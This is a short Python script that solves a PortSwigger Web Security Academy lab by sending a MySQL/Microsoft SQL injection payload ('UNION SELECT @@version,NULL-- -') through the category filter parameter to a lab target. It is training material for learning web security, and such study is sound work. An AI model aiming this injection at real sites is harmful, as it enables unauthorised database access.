import requests
import argparse

# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", help="Specify a target. \nE.g. -t https://abcdefghijk1234567.web-security-academy.net")
args = parser.parse_args()

if not args.target:
    print("[!] You need to specify a target.")
    print("[*] Example usage: sqli-06.py -t https://abcdefghijk1234567.web-security-academy.net")
    exit(0)

# test the connection to the target
r = requests.get(args.target)
if r.status_code == 200:
    print('[*] Target is up')
else:
    print('[!] Target seems down')
    exit(0)

payload = args.target + "/filter?category=Gifts'UNION SELECT @@version,NULL-- -"
print('[*] Payload created: ' + payload)

r = requests.get(payload)
if r.status_code == 200:
    print('[*] Payload sent')
    # check the contents of the file
    completion_text = b'Congratulations'
    if completion_text in r.content:
        print('[*] Success')
else:
    print('[!] Exploit failed')
    exit(0)
